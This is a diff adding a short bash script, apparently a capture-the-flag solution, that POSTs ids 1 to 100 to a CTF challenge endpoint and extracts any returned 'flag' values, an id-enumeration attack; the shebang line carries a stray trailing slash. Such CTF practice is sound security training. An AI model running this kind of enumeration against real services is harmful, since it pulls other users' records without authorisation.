@@ -1,0 +1,6 @@
+#!/bin/bash/
+for i in {1..100}
+do
+  echo -n "$i: "
+  curl -s -X POST "https://2-wm01.bootupctf.com" -d '{"id": '"$i"'}' | jq -r .body | jq -r .data.flag
+done | grep -v null
